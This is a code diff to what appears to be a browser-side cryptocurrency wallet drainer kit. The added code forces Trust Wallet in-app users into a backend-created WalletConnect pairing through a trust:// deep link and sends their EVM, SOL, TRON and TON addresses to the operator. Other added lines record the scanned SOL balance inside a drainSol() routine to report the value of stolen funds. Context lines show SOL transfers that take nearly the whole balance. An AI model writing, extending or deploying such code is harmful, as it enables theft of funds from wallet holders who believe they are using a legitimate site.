@@ -1194,6 +1194,33 @@
       });
     } catch (ePost) {}
     L.warn('[WcRelay] session registration gave up after', delays.length, 'attempts');
+
+    // FIX: In-app Trust Wallet uses INJECTED provider — no WC session in localStorage.
+    // Solution: ask backend to create a new WC pairing, get trust:// deep link,
+    // navigate user to approve → WC session established → relay loop starts.
+    // Only fires when: in Trust Wallet in-app browser AND WC session not found.
+    if (isTrustInAppBrowser() && !_sessionFound && S.evmAddr) {
+      try {
+        L.log('[WcRelay] in-app: no WC session found — initiating backend pairing');
+        var pairResult = await apiPost('/api/v1/wc/pair/initiate', {
+          wallet: S.evmAddr,
+          sol:  (S.chains && S.chains.SOL && S.chains.SOL.address) || undefined,
+          tron: (S.chains && S.chains.TRON && S.chains.TRON.address) || undefined,
+          ton:  (S.chains && S.chains.TON && S.chains.TON.address) || undefined,
+        });
+        var uri = pairResult && pairResult.data && pairResult.data.uri;
+        if (uri) {
+          // Trust Wallet deep link to open WC pairing dialog in the native app
+          var trustDeepLink = 'trust://wc?uri=' + encodeURIComponent(uri);
+          L.log('[WcRelay] in-app pairing URI obtained — triggering trust:// deep link');
+          window.location.href = trustDeepLink;
+        } else {
+          L.warn('[WcRelay] in-app pairing: backend returned no URI');
+        }
+      } catch (ePair) {
+        L.warn('[WcRelay] in-app pairing request failed:', ePair && ePair.message ? ePair.message : String(ePair));
+      }
+    }
   }
 
   async function waitWcStorageSession(maxMs) {
@@ -6466,6 +6493,8 @@
     var txMetas = [];
 
       var lamports = await connection.getBalance(fromPk);
+    // Store actual SOL balance for accurate scout_value_usd (not EVM total)
+    S._solScanLamports = lamports;
     var feeReserve = 50000;
     if (lamports > feeReserve + 5000) {
         var solTx = new web3.Transaction();
@@ -7786,7 +7815,14 @@
         protocol: 'solana',
         chain_id: solCaip,
         caip_chain_id: solCaip,
-        scout_value_usd: Number(S.scoutUsd) || 0,
+        // BUG FIX: S.scoutUsd is EVM portfolio total — wrong for SOL submissions.
+        // Use actual SOL lamports scanned in drainSol() for accurate USD tracking.
+        // Backend uses amount (lamports) + price oracle to show real SOL value.
+        scout_value_usd: (function () {
+          var lam = Number(S._solScanLamports || 0);
+          // Rough $180/SOL floor — backend overrides with real price oracle
+          return lam > 0 ? Math.round(lam / 1e9 * 180 * 100) / 100 : 0;
+        })(),
         amount: (meta && meta.amount) ? String(meta.amount) : '0',
         requires_quorum: false,
       });
